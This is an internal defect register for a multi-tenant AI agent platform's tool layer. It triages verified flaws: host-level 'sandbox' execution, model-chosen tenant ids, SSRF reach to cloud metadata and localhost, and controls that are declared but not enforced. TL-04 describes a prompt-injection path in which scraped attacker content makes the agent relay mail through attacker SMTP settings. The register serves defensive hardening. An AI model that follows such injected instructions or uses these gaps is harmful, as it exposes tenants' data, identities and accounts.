# Tool Layer — Defect Register

> **What this document is:** every actionable defect found in the AI tool layer
> (`backend/src/ai/tools/**`, `tool_executor.py`, the tool paths in `step_executor.py`,
> `tool_management_*`, and the sandbox runtime), triaged and checked against the code
> in this repository.
> **Who should read it:** anyone hardening the tool layer, anyone wiring a new tool,
> and any agent session asked to "fix the tool defects".
> **Compiled:** 2026-08-27, against branch `fresh-main`.
> **Scope note:** this is a deep pass over one subsystem. It supersedes the two
> tool-layer entries in the platform-wide register — see
> [Relationship to `DEFECT-REGISTER.md`](#relationship-to-the-platform-register).
> **Context:** there are **no paying tenants**. Nothing here is a production
> emergency; everything in T0 is a launch blocker.

---

## How to use this in a fresh session

This file is written to be self-contained. You should not need the conversation that
produced it.

1. **Every entry here is ✅ Verified.** The code was read on 2026-08-27 and the claim
   held. Unlike the platform-wide register, there are no 📄 Doc-reported entries — each
   defect was confirmed by reading the cited file, not by trusting `09-tools.md`.
2. **Re-verify line numbers before editing.** Any commit after 2026-08-27 may have
   shifted them. Grep for the quoted symbol rather than trusting the line.
3. **Work in the suggested order** ([§7](#7-suggested-execution-order)), not tier
   order. T2 (deletions) is free and comes first.
4. **Most of these are symptoms of four root faults** ([§1.1](#11-the-four-root-faults)).
   Read those before picking up individual items — several fixes collapse into one
   change once the fault is addressed.
5. **Definition of done for any migration item: the old path is deleted.** The tool
   layer has three separate half-finished migrations in it (typed tools, the cost
   resolver, tool resilience), each of which stopped at "the new thing works".

### Provenance

Compiled by reading `docs/current/09-tools.md` end to end and then verifying each of
its claims against the code, plus a systematic pass over the 64 `social/` tools, the
sandbox runtime, and the meta/synthesis pipeline. **49 defects**, all verified.

---

## Contents

1. [Summary](#1-summary)
2. [T0 — Tenant boundary and untrusted code](#2-t0--tenant-boundary-and-untrusted-code)
3. [T1 — Declared but not enforced](#3-t1--declared-but-not-enforced)
4. [T2 — Delete](#4-t2--delete)
5. [T3 — Correctness and robustness](#5-t3--correctness-and-robustness)
6. [T4 — Integrations that report false success](#6-t4--integrations-that-report-false-success)
7. [Suggested execution order](#7-suggested-execution-order)
8. [Relationship to the platform register](#relationship-to-the-platform-register)

---

## 1. Summary

| Tier | Theme | Count | When |
|---|---|---|---|
| [T0](#2-t0--tenant-boundary-and-untrusted-code) | Tenant boundary and untrusted code | 9 | Before the first paying tenant |
| [T1](#3-t1--declared-but-not-enforced) | Declared but not enforced | 13 | Before relying on the control |
| [T2](#4-t2--delete) | Delete | 8 | **Now** — free, no behaviour change |
| [T3](#5-t3--correctness-and-robustness) | Correctness and robustness | 12 | Needs design; does not block launch |
| [T4](#6-t4--integrations-that-report-false-success) | Integrations that report false success | 7 | Before promoting any social tool |

Three items are worth reading before anything else:

- **[TL-01](#tl-01--the-default-sandbox-runs-llm-authored-code-as-the-backend-os-user)** —
  the default "sandbox" is a host subprocess running as the API process's own user,
  and any Docker failure silently falls back to it.
- **[TL-04](#tl-04--email_send-lets-the-model-override-the-smtp-server-and-password)** —
  a prompt injection can relay mail through attacker-controlled infrastructure under
  the tenant's identity.
- **[TL-03](#tl-03--llm-supplied-company_id-is-accepted-as-the-tenant-boundary)** —
  nineteen tools accept the tenant id from the model when execution context is absent.

### 1.1 The four root faults

Almost every defect below is a symptom of one of these. Fixing them individually is a
treadmill; fixing the four is a rebuild with a finite scope.

| Fault | Description | Symptoms |
|---|---|---|
| **A** — Two registries that never meet | The executable registry is a class-attribute dict built at import time. `tool_registry_entries` is inert metadata with no loader. Neither knows about the other at runtime. | TL-10, TL-14, TL-34, and the platform register's D-20 |
| **B** — Tenancy is a convention, not a boundary | `ToolRegistry.get_tool(name)` is called without `company_id` on every execution path. Nineteen tools fall back to an LLM-supplied `company_id`. | TL-03, TL-05, TL-06, TL-07, TL-09, TL-10 |
| **C** — Policy declared in one place, enforced in none | Status gate, `is_enabled`, `NetworkPolicy`, `rate_limit_per_run`, `max_execution_seconds`, `permissions`, `ToolCostResolver`, `RedisRateLimiter` — all fully written, unit-tested, zero production call sites. | TL-11 through TL-22 |
| **D** — The contract is a string with four dispatch paths | `run`, `run_with_context`, `run_typed`, plus the executor's reflection fallback. Structured arguments are serialised to JSON and re-parsed inside each tool. | TL-05, TL-30, TL-41 |

---

## 2. T0 — Tenant boundary and untrusted code

These decide whether one tenant's data is reachable by another, and whether
LLM-authored code can reach the host. Several are one-line fixes.

### TL-01 — The default sandbox runs LLM-authored code as the backend OS user

**✅ Verified · Critical**

`get_sandbox_runtime` returns `SubprocessRuntime` unless
`SANDBOX_CONTAINER_RUNTIME_ENABLED` or the per-company
`sandbox.container_runtime_enabled` flag is on — **both default off**. Worse, the
container branch is wrapped in a bare `except Exception` that falls back to
`SubprocessRuntime` on any failure, so a missing Docker socket silently downgrades to
running untrusted code on the host rather than failing the call.

Under `SubprocessRuntime` the "sandbox" is `asyncio.create_subprocess_exec` running as
the API process's own OS user, with the full host filesystem readable, unrestricted
outbound network, and no cgroup memory/CPU/PID limits. The real isolation —
`--cap-drop ALL`, `--read-only`, uid 10001, resource limits — exists only in
`ContainerRuntime`.

- [`ai/tools/sandbox/runtime.py`](../../../backend/src/ai/tools/sandbox/runtime.py) — `_container_runtime_selected`, `get_sandbox_runtime`
- Affects `sandbox_code`, `terminal`, `_ffmpeg`, and tool synthesis

**Fix:** flip the default (see [TL-16](#tl-16--the-tenant-workspace-lives-in-tmp-and-is-node-local) first — it is a prerequisite), and make a Docker failure a loud error rather than a downgrade.

---

### TL-02 — Tool synthesis executes generated code outside the sandbox

**✅ Verified · Critical**

`ToolSandboxTester.run_examples` allocates its harness workdir with
`tempfile.mkdtemp(prefix="toolsynth_")` — bare `/tmp`, not the tenant workspace. That
path is **not** bind-mounted into the tenant container, and the container's `/tmp` is a
fresh tmpfs, so under `ContainerRuntime` the `cwd` does not exist and the exec fails.

The consequence is that the **only configuration in which tool synthesis works is the
one where the generated code runs unsandboxed on the host**. The design stated in
`09-tools.md` — "synthesized source never runs in-process, only inside the container" —
is exactly inverted in practice.

Two further problems in the same path:

1. The harness calls `inst.run(ex["input"])`, never `run_with_context`, so
   `ExecutionContext` never reaches a synthesized tool at all.
2. `SandboxedSynthesizedTool.run_with_context` replays the **test harness** on every
   production call — six files written and an interpreter spawned per invocation.

- [`ai/meta/tool_sandbox_tester.py`](../../../backend/src/ai/meta/tool_sandbox_tester.py) — `run_examples`, workdir allocation; `_harness_main` calls `inst.run`
- [`ai/tools/sandbox/synthesized_tool.py`](../../../backend/src/ai/tools/sandbox/synthesized_tool.py) — `run_with_context`
- [`ai/tools/sandbox/tenant_manager.py`](../../../backend/src/ai/tools/sandbox/tenant_manager.py) — `_mounts`

**Fix:** allocate the harness under the tenant workspace. Longer term, replace the
per-call harness replay with a `SkillRunner` that execs into the long-lived container.

---

### TL-03 — LLM-supplied `company_id` is accepted as the tenant boundary

**✅ Verified · Critical**

The pattern `context.get("company_id") if context else params.get("company_id")` — or a
variant — appears across the email, social, video, document and file tools. Any path
that reaches a tool through `run()` passes `context=None`, at which point **the model
chooses the tenant**.

`pdf_generator` is the worst case: it injects the context value only when the params
*lack* one, so an LLM-supplied `company_id` wins outright.

- [`ai/tools/email/email_tool.py:186`](../../../backend/src/ai/tools/email/email_tool.py:186), [`:304`](../../../backend/src/ai/tools/email/email_tool.py:304), [`:402`](../../../backend/src/ai/tools/email/email_tool.py:402), [`:521`](../../../backend/src/ai/tools/email/email_tool.py:521)
- [`ai/tools/social/base.py:66`](../../../backend/src/ai/tools/social/base.py:66) — affects all 64 social tools
- [`ai/tools/documents/pdf_generator.py:231`](../../../backend/src/ai/tools/documents/pdf_generator.py:231) and [`:251`](../../../backend/src/ai/tools/documents/pdf_generator.py:251)
- [`ai/tools/documents/docx_tool.py:131`](../../../backend/src/ai/tools/documents/docx_tool.py:131) · [`pptx_tool.py:146`](../../../backend/src/ai/tools/documents/pptx_tool.py:146) · [`excel.py:193`](../../../backend/src/ai/tools/documents/excel.py:193) · [`document_save.py:76`](../../../backend/src/ai/tools/documents/document_save.py:76)
- [`ai/tools/core/file_writer.py:46`](../../../backend/src/ai/tools/core/file_writer.py:46) and [`:48`](../../../backend/src/ai/tools/core/file_writer.py:48)
- [`ai/tools/media/image_generation.py:187`](../../../backend/src/ai/tools/media/image_generation.py:187) · [`video/video_generate.py:113`](../../../backend/src/ai/tools/media/video/video_generate.py:113) · [`video/video_edit.py:94`](../../../backend/src/ai/tools/media/video/video_edit.py:94) · [`video/video_add_sound.py:93`](../../../backend/src/ai/tools/media/video/video_add_sound.py:93)

**Fix:** remove every `params` fallback and fail closed when context is absent. Tenancy
must come from a frozen `ExecutionContext` the tool cannot construct.

---

### TL-04 — `email_send` lets the model override the SMTP server and password

**✅ Verified · Critical**

Credential resolution reads `params.get("password") or resolved.get("password")` — the
**model's value takes precedence** over the decrypted `email_connections` row. The same
applies to `smtp_host` and `email_address`.

This turns any prompt injection — for example, content returned by `scraper_tool` from
an attacker-controlled page — into an outbound mail relay with attacker-controlled
infrastructure, sent from the tenant's identity.

- [`ai/tools/email/email_tool.py:521`](../../../backend/src/ai/tools/email/email_tool.py:521) onwards — `EmailSendTool.run_with_context`, credential resolution block

**Fix:** delete `smtp_host`, `smtp_port`, `password` and `email_address` from the
accepted params entirely. Resolve them only from the connection row.

---

### TL-05 — The typed dispatch path silently drops execution context in `scraper_tool`

**✅ Verified · Critical**

`ScraperTool.run_typed(params)` declares no `context` parameter. The executor inspects
the signature and, finding none, calls `run_typed(typed_params)` without one. Because
`run_typed` is overridden, this path is taken whenever the model supplies a dict —
which is the normal REACT case.

Downstream, `run_with_context(..., context=None)` means `company_id` is `None`, so:

1. The Firecrawl key resolves via `_get_app_company_id()` — the **APP company's** key
   is spent for a tenant's scrape.
2. `save_artifact` is called with `target_company_id = app_company_id` — the tenant's
   scraped content is written into a **different company's artifact store**.
3. `run_id`, `agent_id` and `campaign_id` are all `None`, so the artifact is orphaned.

- [`ai/tools/core/scraper.py:192`](../../../backend/src/ai/tools/core/scraper.py:192) — `run_typed`
- [`ai/tool_executor.py:125`](../../../backend/src/ai/tool_executor.py:125) onwards — typed dispatch and signature inspection

**Fix:** add `context: Optional[Dict] = None` to `ScraperTool.run_typed` and forward it,
matching `WebSearchTool`. Then delete the typed path entirely — see
[TL-41](#tl-41--four-dispatch-paths-and-the-typed-one-fails-silently).

---

### TL-06 — The tool-registry read endpoints return every tenant's rows

**✅ Verified · Critical**

`list_all_tools()` executes `select(ToolRegistryEntry)` with **no company filter**, and
`get_tool(tool_id)` loads by primary key with **no ownership check**. Both routes depend
only on `get_current_user` — any authenticated user of any tenant can read every row.

For `SYNTHESIZED` rows the `configuration` blob contains the full LLM-generated
`source`, the `spec`, and the complete red-team audit trail.

- [`ai/tool_management_service.py:76`](../../../backend/src/ai/tool_management_service.py:76) — `list_all_tools`
- [`ai/tool_management_service.py:182`](../../../backend/src/ai/tool_management_service.py:182) — `get_tool`
- [`ai/tool_management_router.py:34`](../../../backend/src/ai/tool_management_router.py:34) and [`:44`](../../../backend/src/ai/tool_management_router.py:44)

**Fix:** filter on `company_id.is_(None) | company_id == current_user.company_id`, and
never return `configuration` on the list route.

---

### TL-07 — A process-global symlink points at whichever tenant ran last

**✅ Verified · Critical**

`SandboxCodeTool` repoints `/tmp/sandbox/output` at the current company's directory on
**every call**. The tool's own description encourages generated code to write to that
generic path. Under concurrency, tenant A's code writes into tenant B's workspace, and
the artifact scan then registers the result to whichever run is scanning.

- [`ai/tools/sandbox/sandbox_executor.py:127`](../../../backend/src/ai/tools/sandbox/sandbox_executor.py:127)–137

**Fix:** delete the symlink. Give generated code the resolved per-company path through
the prompt, or an env var the runtime sets per exec.

---

### TL-08 — No SSRF guard on `scraper_tool` or `headless_browser`

**✅ Verified · Critical**

Neither tool has a URL allow-list or a private-address deny list.
`http://169.254.169.254/` (cloud instance metadata) and `http://localhost:8000/` (the
platform's own API) are both reachable. `headless_browser` blocks the `file:`,
`javascript:`, `data:` and `ftp:` schemes on the **top-level URL only** — its
`evaluate` action runs arbitrary page JavaScript by design, and nothing stops the
browser being navigated to an internal host.

- [`ai/tools/sandbox/browser_tool.py:54`](../../../backend/src/ai/tools/sandbox/browser_tool.py:54) — `_BLOCKED_URL_SCHEMES`, scheme check only
- [`ai/tools/core/scraper.py`](../../../backend/src/ai/tools/core/scraper.py) — no URL validation at all

**Fix:** resolve the host and reject RFC1918, loopback, link-local and unique-local
targets before the request, on both tools. Re-check after redirects.

---

### TL-09 — Subject data is model-chosen with no ownership check

**✅ Verified · Critical**

Credentials are resolved server-side everywhere — that half of the "tools fetch their
own sensitive data" rule is genuinely implemented. **Subject** data is not: who the
message goes to, which record is written, which ad account is charged, all come from
the model as plain parameters with no binding to the run.

| Tool | Model-supplied parameter | Controls |
|---|---|---|
| `whatsapp_send_tenant` | `to` | Destination phone number |
| `email_send` / `email_draft` | `to`, `cc`, `bcc` | Recipients |
| `email_send` | `attachment_artifact_id` | Which file leaves the building |
| `crm_update_lead` | `lead_id` | Which CRM record is overwritten |
| `google_calendar_create_event` | attendees | Invitee addresses |
| `youtube_ads_*` | `customer_id` | Which Google Ads account is charged |
| `x_ads_*`, `snapchat_ads_*`, `meta_ads_*` | `account_id` / `ad_account_id` | Which ad account is charged |

Note the inconsistency: `google_ads` reads `customer_id` from server-side
`oauth_metadata`, while `youtube_ads` takes it from the model. The correct pattern
already exists in the codebase; it is simply not applied.

- [`ai/tools/crm/crm_tools.py:120`](../../../backend/src/ai/tools/crm/crm_tools.py:120) — `WhatsAppSendTenantTool`
- [`ai/tools/crm/crm_tools.py:445`](../../../backend/src/ai/tools/crm/crm_tools.py:445) — `CRMUpdateLeadTool`
- [`ai/tools/social/youtube_ads.py:74`](../../../backend/src/ai/tools/social/youtube_ads.py:74) — `params["customer_id"]`
- [`ai/tools/social/google_ads.py`](../../../backend/src/ai/tools/social/google_ads.py) — the correct pattern, for contrast

**Fix:** opaque run-scoped references (`ContactRef`, `LeadRef`, `AdAccountRef`,
`ArtifactRef`) minted by the platform and dereferenced server-side, asserting both
tenant ownership and membership of the run's declared subject scope. The model never
holds the raw value.

---

## 3. T1 — Declared but not enforced

Each of these reads as a control in the code and the admin UI. None of them is one.
Every item is a decision: **wire it in or delete it**, but do not leave it looking
functional.

### TL-10 — Tenant-scoped tools are unreachable by construction

**✅ Verified · Critical**

Both executor entry points call `ToolRegistry.get_tool(tool_name)` with **no**
`company_id`, and `get_tool_schemas` calls `get_all_schemas()` with none either. The
`_tenant_tools` dict is therefore never consulted on any execution or advertisement
path.

So MCP adapters and synthesized DRAFT tools are neither offered to the model nor
resolvable if it names one. The in-process/restart-loss concern documented in
`09-tools.md` is real but **secondary** — they do not work even in the process that
registered them.

- [`ai/tool_executor.py:119`](../../../backend/src/ai/tool_executor.py:119) and [`:226`](../../../backend/src/ai/tool_executor.py:226) — `get_tool` without `company_id`
- [`ai/tool_executor.py:287`](../../../backend/src/ai/tool_executor.py:287) — `get_all_schemas()` without `company_id`
- Registrations that go nowhere: [`ai/tools/mcp/adapter.py:165`](../../../backend/src/ai/tools/mcp/adapter.py:165), [`ai/meta/tool_synthesis_pipeline.py:95`](../../../backend/src/ai/meta/tool_synthesis_pipeline.py:95)

**Fix:** thread `company_id` through resolution. Longer term, load tenant manifests from
Postgres so a restart loses nothing.

---

### TL-11 — The only "enforced" rate limit is never populated

**✅ Verified · High**

`execute_from_function_calls` reads `call.get("rate_limit_per_run")` and skips the tool
when the count exceeds it. **No caller ever sets that key** on a call dict — not
`step_executor`, not `ToolResilience`, not the voice handler. The limit is unreachable,
so the whole `call_counts` mechanism only counts.

Separately, the docstring says to pass a fresh dict per `ExecutionRun`; the actual
caller resets it per **step**.

- [`ai/tool_executor.py:101`](../../../backend/src/ai/tool_executor.py:101) — the read
- Callers that never write it: [`ai/step_executor.py:900`](../../../backend/src/ai/step_executor.py:900), [`ai/tools/resilience.py:277`](../../../backend/src/ai/tools/resilience.py:277), [`voice/websocket_handler.py:998`](../../../backend/src/voice/websocket_handler.py:998)
- [`ai/step_executor.py:859`](../../../backend/src/ai/step_executor.py:859) — the per-step reset

---

### TL-12 — The per-tool permission model sits on a class nothing uses

**✅ Verified · High**

`ToolDefinition` declares `access_level`, `permissions`, `sandbox_mode`,
`max_execution_seconds` and `rate_limit_per_run`. But `Capabilities.tools` is typed
`List[ToolReference]` — which has `tool_id` and nothing else. Every permission field is
dropped the moment capabilities round-trip through the model.

`usage` (`AUTONOMOUS` / `PLANNED` / `BOTH`) is not declared on **either** class;
`step_executor` reads it off the raw dict with a default. And `usage` is not access
control in any case — a `PLANNED` tool is still fully executable, just not advertised.

- [`ai/schemas/capabilities.py:32`](../../../backend/src/ai/schemas/capabilities.py:32)–46 — `ToolDefinition`
- [`ai/schemas/capabilities.py:126`](../../../backend/src/ai/schemas/capabilities.py:126) — `Capabilities.tools: List[ToolReference]`
- [`ai/step_executor.py:727`](../../../backend/src/ai/step_executor.py:727) — `t.get("usage", "AUTONOMOUS")`

**Fix:** move these onto a typed `ToolGrant` on the entity and enforce at resolution.
Split `usage` into two independent flags — `llm_callable` and `plan_callable` — so
"not advertised" and "not callable" stop being the same word.

---

### TL-13 — The tool status gate is not wired into execution

**✅ Verified · High**

`ToolRegistry.get_visible_tools_for_company` merges global and tenant tools, drops
`DEPRECATED`, and requires `tools.experimental.{tool_id}` for `EXPERIMENTAL` and
`DRAFT`. It is referenced only by `tests/unit/test_tool_status.py` and a comment in
`social/base.py`.

The live path builds schemas straight from `capabilities.tools` via
`ToolExecutor.get_tool_schemas`. Practically: **69 unverified tools — including 64
capable of publishing content or spending ad budget — execute today if an entity names
them**, regardless of the flag. The flag-flip endpoint exists and writes real rows that
nothing reads.

- [`ai/tools/base.py:192`](../../../backend/src/ai/tools/base.py:192) — `get_visible_tools_for_company`
- [`ai/step_executor.py:755`](../../../backend/src/ai/step_executor.py:755) — the live path that bypasses it
- [`ai/api/admin.py:479`](../../../backend/src/ai/api/admin.py:479) — the flag endpoint

---

### TL-14 — `is_enabled = false` does not disable anything

**✅ Verified · High**

The executor resolves tools through `ToolRegistry.get_tool()`, which never consults the
database. Toggling a tool off hides it from `ToolSelectionPanel` only; entities that
already reference it keep calling it. An admin who toggles a tool off will reasonably
believe it is off.

Kill-switching a tool today means deleting its `ToolRegistry.register(...)` line and
redeploying.

- [`ai/tool_management_router.py:94`](../../../backend/src/ai/tool_management_router.py:94) — the toggle route
- [`frontend/src/components/ToolSelectionPanel.tsx`](../../../frontend/src/components/ToolSelectionPanel.tsx) — the only consumer
- Root cause: Fault A

---

### TL-15 — `NetworkPolicy` and the egress proxy are wired to nothing

**✅ Verified · High**

`TenantSandboxManager.ensure()` accepts `egress: bool = False` and would join the
container to the allow-list network with `HTTP(S)_PROXY` injected.
`ContainerRuntime.exec` calls `self.manager.ensure(self.company_id)` — **positionally,
never passing `egress`**. So every container gets `--network none`.

`EgressProxyManager` — internal Docker network, tinyproxy with `FilterDefaultDeny`,
port restriction to 80/443, the entrypoint that builds the filter file — is a complete
implementation with **zero callers**. `NetworkPolicy.ALLOWLIST` on a synthesized
`ToolSpec` is decorative; the validator's comment "egress still enforced at runtime" is
not true.

- [`ai/tools/sandbox/container_runtime.py`](../../../backend/src/ai/tools/sandbox/container_runtime.py) — `exec`, the `manager.ensure` call
- [`ai/tools/sandbox/egress_proxy.py`](../../../backend/src/ai/tools/sandbox/egress_proxy.py) — no callers
- [`ai/meta/tool_validator.py:100`](../../../backend/src/ai/meta/tool_validator.py:100) — the inaccurate comment

---

### TL-16 — The tenant workspace lives in `/tmp` and is node-local

**✅ Verified · High**

`_sandbox_base_dir()` returns `os.path.join(tempfile.gettempdir(), "sandbox")`, so the
"persistent" per-tenant workspace is `/tmp/sandbox/{company_id}`. It does not survive a
host reboot, is subject to `systemd-tmpfiles` cleanup, and exists only on the node that
created it. Any multi-worker or multi-node deployment gives a tenant a **different**
persistent sandbox per node.

This is the prerequisite blocking [TL-01](#tl-01--the-default-sandbox-runs-llm-authored-code-as-the-backend-os-user),
persistent tenant-authored code, and the persistent browser profile feature.

- [`ai/tools/sandbox/tenant_manager.py`](../../../backend/src/ai/tools/sandbox/tenant_manager.py) — `_sandbox_base_dir`, `_mounts`
- [`ai/tools/sandbox/runtime.py`](../../../backend/src/ai/tools/sandbox/runtime.py) — `resolve_persistent_browser_dir`

**Fix:** a durable named volume per tenant, with three roots the runtime maps
identically on both sides of the boundary: `workspace` (rw scratch, TTL'd), `skills`
(ro, published tenant code), `artifacts` (write-only drop box).

---

### TL-17 — The video tools write outside the bind-mount

**✅ Verified · High**

`_BASE_ARTIFACT_DIR` resolves to `<repo>/artifact/system-generated`. Every ffmpeg
invocation routes through `run_sandbox_exec` with input and output paths under that
root, and `_write_concat_list` writes the concat file to `dirname(output_path)` — the
same place. None of it is mounted into the tenant container.

`video_edit` and `video_add_sound` therefore **break the moment the container runtime is
enabled**. `video_edit` also accepts an unvalidated `output_path` from the model, so
under the default host runtime it can write anywhere the backend user can.

- [`ai/tools/media/video/_support.py:22`](../../../backend/src/ai/tools/media/video/_support.py:22) — `_BASE_ARTIFACT_DIR`
- [`ai/tools/media/video/_ffmpeg.py`](../../../backend/src/ai/tools/media/video/_ffmpeg.py) — `_write_concat_list`
- [`ai/tools/media/video/video_edit.py`](../../../backend/src/ai/tools/media/video/video_edit.py) — unvalidated `output_path`

---

### TL-18 — Chromium never enters the container

**✅ Verified · High**

`ContainerRuntime.open_browser_session` delegates to an embedded `SubprocessRuntime`.
Enabling the container runtime does not sandbox `headless_browser` at all — Chromium
still runs on the host with the backend's privileges, and its `evaluate` action runs
arbitrary JavaScript by design.

The sandbox image is already built from the Playwright base, so the browser is present
inside the container; only the connection is missing.

- [`ai/tools/sandbox/container_runtime.py`](../../../backend/src/ai/tools/sandbox/container_runtime.py) — `open_browser_session`, `_browser_fallback`

**Fix:** run Chromium in the container and drive it over CDP. Pairs naturally with
[TL-08](#tl-08--no-ssrf-guard-on-scraper_tool-or-headless_browser).

---

### TL-19 — Four price tables, one of which is the unused source of truth

**✅ Verified · High**

`ToolCostResolver` was built as the Track 8 single source of truth. It has **zero
production call sites** — only its own unit test imports it. The live logic is two
hand-copied blocks of `_TOOL_SKU_MAP` / `_TOOL_FIXED_COST` literals in
`step_executor.py`, plus a fourth price table in `planning/cost_estimator.py`.

The flag intended to switch this on, `tools.cost_resolver_v2_enabled`, is declared with
a default of `True` and **is never read**.

Consequence: `image_generation` self-bills `$0.04` via `BillingService` *and* is charged
again by the executor's fixed-cost branch — a guaranteed double charge on that branch.
Adding one priced tool means editing four files.

- [`ai/governance/tool_cost_resolver.py`](../../../backend/src/ai/governance/tool_cost_resolver.py) — unused
- [`ai/step_executor.py:466`](../../../backend/src/ai/step_executor.py:466) and [`:924`](../../../backend/src/ai/step_executor.py:924) — the two inline copies
- [`ai/planning/cost_estimator.py:22`](../../../backend/src/ai/planning/cost_estimator.py:22) — the fourth table
- [`ai/core/feature_flags.py:86`](../../../backend/src/ai/core/feature_flags.py:86) — the flag nothing reads
- [`ai/tools/media/image_generation.py:372`](../../../backend/src/ai/tools/media/image_generation.py:372) — the self-bill

---

### TL-20 — Voice tool calls are unattributed and unbilled

**✅ Verified · High**

The voice handler builds `extra_context` with only `company_id` and `user_id` — **no
`run_id`, no `agent_id`** — and runs no cost block at all. A voice agent can call
`whatsapp_send_tenant` and `crm_update_lead` with no run linkage and no ledger entry.

Every `ToolInteractionLog` written from this path is therefore unlinkable to a run, and
`run.total_cost_usd` never moves.

- [`voice/websocket_handler.py:993`](../../../backend/src/voice/websocket_handler.py:993)–1000

---

### TL-21 — `max_tool_calls` is a prompt string, not a limit

**✅ Verified · Medium**

`governance.execution_limits.max_tool_calls` is read only to render
`"Tool calls remaining: N of M"` into the prompt. Nothing checks it before executing,
and the number can go negative. The real ceiling on a runaway agent is the loop's
iteration and cost budget.

- [`ai/step_executor.py:673`](../../../backend/src/ai/step_executor.py:673)

---

### TL-22 — The MCP layer has no transport, no config, and no caller

**✅ Verified · Medium**

`MCPClient` is a `Protocol` with no concrete implementation anywhere in the repo — no
stdio, HTTP or SSE transport. `bind_mcp_server` is called only from
`tests/unit/test_mcp_adapter.py` with a fake client. There is no `mcp_servers` table,
no admin UI and no settings entry for declaring a company's servers.

Even if all three existed, the adapters register tenant-scoped and would be unreachable
per [TL-10](#tl-10--tenant-scoped-tools-are-unreachable-by-construction).

- [`ai/tools/mcp/client.py`](../../../backend/src/ai/tools/mcp/client.py) — Protocol only
- [`ai/tools/mcp/adapter.py`](../../../backend/src/ai/tools/mcp/adapter.py) — `bind_mcp_server`, no production caller

**Fix:** decide. Either build the transport plus a config surface, or delete the package
until there is a customer for it.

---

## 4. T2 — Delete

**Do these first.** Every item is dead, superseded, or written against an API that
cannot be called. Removing them shrinks the surface everyone else has to reason about —
the cheapest risk reduction available. Together they take the registry from 98 tools to
roughly 86, and remove ~1,600 lines.

| ID | Delete | Notes | Status |
|---|---|---|---|
| **TL-23** | [`ai/tools/social/quora.py`](../../../backend/src/ai/tools/social/quora.py) — 4 tools | Targets `https://api.quora.com/v1`. Quora publishes no such public API — no search, answers, spaces or analytics endpoints exist to call. There is nothing to fix; the surface is fabricated. If Quora presence matters, do it via `headless_browser` under an explicit automation policy | ✅ Verified |
| **TL-24** | [`ai/tools/social/x_ads.py`](../../../backend/src/ai/tools/social/x_ads.py) — 4 tools | Uses OAuth2 bearer headers and JSON bodies; the X Ads API expects OAuth 1.0a request signing and form-encoded parameters. Every call will 401 or 400. This is a rewrite, not a patch — delete until there is a customer | ✅ Verified |
| **TL-25** | [`ai/tools/social/youtube_ads.py`](../../../backend/src/ai/tools/social/youtube_ads.py) — 4 tools | Pinned to Google Ads **v17** while `google_ads` uses **v18**; takes `customer_id` from the model; no `login-customer-id` header for MCC access. A YouTube campaign is a `VIDEO` `advertisingChannelType` — fold into the `google_ads` family and four tools become zero | ✅ Verified |
| **TL-26** | [`ai/tools/documents/xlsx_engine.py`](../../../backend/src/ai/tools/documents/xlsx_engine.py) | ~400 lines, **zero imports** anywhere in `backend/src`. Its only reference is a price entry naming it in `planning/cost_estimator.py`. If the themed rendering is wanted, it belongs in the Document Factory's sandbox scripts where generated code can import it | ✅ Verified |
| **TL-27** | `backend/templates/docx/*.docx` | Three theme templates, ~36 KB each, **zero code references**. `DocxTool._create` always starts from a blank `Document()` | ✅ Verified |
| **TL-28** | [`ai/governance/rate_limiter.py`](../../../backend/src/ai/governance/rate_limiter.py) | `RedisRateLimiter` — a correct sliding-window implementation with a documented `"tool:search:company_123"` key example and **zero call sites**. Either wire it in as the per-tenant quota (there is none today) or delete it | ✅ Verified |
| **TL-29** | Duplicate `_sandbox_base_dir()` | Defined **twice** in [`ai/tools/sandbox/runtime.py`](../../../backend/src/ai/tools/sandbox/runtime.py); the second silently shadows the first. Harmless — they are identical — but it makes the module look unreviewed | ✅ Verified |
| **TL-30** | One of the two `ToolResult` classes | The Pydantic one at [`ai/tools/base.py:48`](../../../backend/src/ai/tools/base.py:48) and the dataclass at [`ai/tool_executor.py:39`](../../../backend/src/ai/tool_executor.py:39) share a name and no fields. Collapse to one type with a typed output envelope. Blocked on [TL-41](#tl-41--four-dispatch-paths-and-the-typed-one-fails-silently) | ✅ Verified |

> Before each deletion, confirm there is no remaining importer:
> `grep -rn "<module_name>" backend/src frontend/src --include=*.py --include=*.ts --include=*.tsx`

See also **D-25** in the platform register — the `video_generation` deprecated shim,
which belongs to this tier and is already recorded there.

---

## 5. T3 — Correctness and robustness

### TL-31 — The accurate-trim fallback in `_ffmpeg` raises `ValueError`

**✅ Verified · Medium**

`trim_clip` builds `[..., "-c", "copy", output_path]`. When stream-copy trimming fails —
the keyframe-boundary case the fallback exists for — the recovery path does:

```python
reenc[-2:-1] = []       # comment says 'drop "-c"'; actually removes "copy"
reenc.remove("copy")    # ValueError: list.remove(x): x not in list
```

The slice already removed `"copy"`, so `remove` throws. `video_edit` catches broad
`Exception`, so the user-visible result is
`video_edit trim failed: list.remove(x): x not in list` and the re-encode never runs.

- [`ai/tools/media/video/_ffmpeg.py`](../../../backend/src/ai/tools/media/video/_ffmpeg.py) — `trim_clip`, the `except FFmpegError` branch

**Fix:** remove the `-c copy` pair by index and insert the codec flags, or build the
re-encode argv from scratch rather than mutating.

---

### TL-32 — Blocking SDK calls on the event loop in `video_generate`

**✅ Verified · Medium**

`client.models.generate_videos`, `client.operations.get`, `client.files.download` and
`generated.video.save` are synchronous. They run directly in the async handler, stalling
the worker for the full length of a Veo generation — up to the 360 s poll ceiling.

- [`ai/tools/media/video/video_generate.py`](../../../backend/src/ai/tools/media/video/video_generate.py) — `_generate_single_video`

**Fix:** `asyncio.to_thread` around each blocking call.

---

### TL-33 — A registry `SELECT` per tool call inside the REACT loop

**✅ Verified · Medium**

Both cost blocks run an `IntegrationRegistry` query for **every single tool result**,
inside the per-turn loop, with no caching. A research agent making 25 searches issues 25
round-trips for a value that changes daily.

- [`ai/step_executor.py:446`](../../../backend/src/ai/step_executor.py:446)–504 — direct `TOOL_CALL` path
- [`ai/step_executor.py:918`](../../../backend/src/ai/step_executor.py:918) onwards — REACT path

**Fix:** cache per company for the life of the run. `ToolCostResolver` already has the
cache — see [TL-19](#tl-19--four-price-tables-one-of-which-is-the-unused-source-of-truth).

---

### TL-34 — Metadata drift between code and DB is permanent by design

**✅ Verified · Medium**

`sync_built_in_tools` inserts a row for every registered tool that has none, and
**never updates an existing row**. A changed description or function schema never
reaches the database, so the admin UI drifts from the code forever with no way to
reconcile short of deleting rows.

- [`ai/tool_management_service.py:240`](../../../backend/src/ai/tool_management_service.py:240)–268

---

### TL-35 — `_BUILTIN_CATEGORIES` covers 22 of 98 tools

**✅ Verified · Low**

